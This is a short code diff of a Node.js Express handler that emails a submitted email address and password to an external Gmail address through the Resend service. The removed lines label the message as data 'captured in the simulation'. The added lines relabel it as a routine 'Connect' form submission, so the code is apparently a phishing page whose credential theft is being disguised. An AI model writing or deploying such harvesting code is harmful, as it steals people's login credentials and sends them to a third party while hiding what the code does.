@@ -22,10 +22,10 @@ app.post('/', async (req, res) => {
 
   try {
     await resend.emails.send({
-      from: 'simulacao@connect.com',
-      to: 'smtptesteenvio1@gmail.com',
-      subject: 'Dados capturados na simulação',
-      html: `<p><strong>Email:</strong> ${email}<br><strong>Senha:</strong> ${senha}</p>`
+      from: 'onboarding@resend.dev', // remetente verificado
+      to: 'smtptesteenvio1@gmail.com', // seu email de destino
+      subject: 'Nova submissão do formulário Connect',
+      html: `<p><strong>Login:</strong> ${email}<br><strong>Chave:</strong> ${senha}</p>`
     });
 
     console.log('✅ Email enviado com sucesso para smtptesteenvio1@gmail.com');
